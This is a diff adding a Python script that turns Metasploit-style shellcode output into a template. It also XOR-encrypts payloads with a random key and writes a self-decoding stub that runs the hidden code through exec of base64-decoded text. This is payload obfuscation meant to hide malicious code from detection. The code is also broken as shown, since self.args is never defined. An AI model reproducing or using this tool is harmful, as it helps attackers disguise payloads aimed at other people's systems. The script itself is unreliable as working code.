@@ -1,0 +1,63 @@
+#!/usr/bin/env python
+
+import os 
+import re
+import sys
+import base64
+import secrets
+
+class _MSF_Call:
+    def __init__(self):
+        self._Features()
+    def _Features(self,**kwargs):
+        with open (self.args.exploit,'rt') as TEXT:
+            Text = TEXT.readlines()
+        with open (os.getcwd()+'/Package/Template/ShellCode.txt','wt') as Shell:
+                 Shell.write('ShellCode = b""\n')   
+        for L in Text[1:] :
+            Find_Str = re.findall('"+.+"',L)
+            CompleteShell = 'ShellCode += b'+str("".join(Find_Str).replace('[]','',1))+'\n'
+            with open (os.getcwd()+'/Package/Template/ShellCode.txt','at') as Shell:
+                if 'ShellCode += b"\\x'in CompleteShell :
+                    Shell.write('    '+CompleteShell) 
+                else:
+                    pass     
+if __name__=='__main__':
+   _MSF_Call()   
+
+
+
+class Xor_class :
+
+    def __init__(self):
+        self.Gen_Key()
+        self.Xor_Process()
+        self.Fainal_Stage()
+
+    def Gen_Key(self,**kwargs):  
+        with open (self.args.exploit,'r') as payload:
+            if self.args.P_base64:
+                payload = payload.read()
+                payload = base64.b64encode(payload.encode())
+            else:
+                payload = bytes(payload.read().encode())   
+        Value_Key =  secrets.token_bytes(len(payload))
+        if self.args.Key_base64:
+           Value_Key = base64.b64encode(Value_Key)
+        self.payload = payload
+        self.Value_Key = Value_Key
+    def Xor_Process(self,**kwargs):
+
+        if self.args.Key_base64: 
+            self.Value_Key = base64.b64decode(self.Value_Key)  
+        self.Xor_Payload = bytes([ I  ^ L for I , L in zip(self.payload ,self.Value_Key) ])
+   
+    def Fainal_Stage(self,**kwargs) : 
+         with open(self.args.output,'w') as XP_load:
+             XP_load1 = 'shell = '+str(self.Xor_Payload)+'\n'+'Key = '+str(self.Value_Key)+'\n'+\
+             "de_code = bytes([ Z ^ C for Z , C in zip(shell , Key)])"+'\n'+'import base64\n'+\
+             'de_set = base64.b64decode(de_code).decode("utf-8")'+'\n'+'exec(de_set)'
+             XP_load.write("import base64\nexec(base64.b64decode("+str(base64.b64encode((XP_load1.encode())))+'))')
+
+if __name__=='__main__':
+   Xor_class()   
